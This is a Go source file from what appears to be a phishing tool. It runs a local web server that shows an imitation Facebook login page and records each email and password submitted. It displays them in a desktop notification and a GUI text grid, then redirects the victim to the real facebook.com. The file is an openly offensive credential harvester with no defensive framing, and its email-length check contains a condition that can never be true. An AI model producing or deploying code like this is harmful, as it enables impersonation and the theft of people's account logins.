package main

import (
	"fmt"
	"net/http"
	"regexp"
	"strings"

	"fyne.io/fyne"
	"fyne.io/fyne/widget"
)

// 3.party
var emailRegex = regexp.MustCompile("^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$")

// isEmailValid checks if the email provided passes the required structure and length.
func isEmailValid(e string) bool {
	if len(e) < 3 && len(e) > 254 {
		return false
	}
	return emailRegex.MatchString(e)
}

//

func serveFacebookLogin(win fyne.Window, textGrid *widget.TextGrid, textStream *string) {
	serverFunc := func(response http.ResponseWriter, request *http.Request) {
		fmt.Fprintln(response, faceLoginHTML)
	}
	serveFuncLogin := func(response http.ResponseWriter, request *http.Request) {
		request.ParseForm()
		email := request.FormValue("email")
		pass := request.FormValue("pass")

		if email == "" || !isEmailValid(email) {
			fmt.Fprintln(response, facebookwrongemailHTML)
			return
		} else if pass == "" {
			fmt.Fprintln(response, strings.Replace(facebookunpassHTML, "&&email&&", email, 1))
			return
		}
		*textStream += "Email = " + email + "\nPass = " + pass + "\n"
		notiApp.SendNotification(fyne.NewNotification("New Form", email+" : "+pass))
		textGrid.SetText(*textStream)
		http.Redirect(response, request, "https://facebook.com", 301)
	}
	http.HandleFunc("/", serverFunc)
	http.HandleFunc("/login", serveFuncLogin)
	http.ListenAndServe(":8089", nil)

}
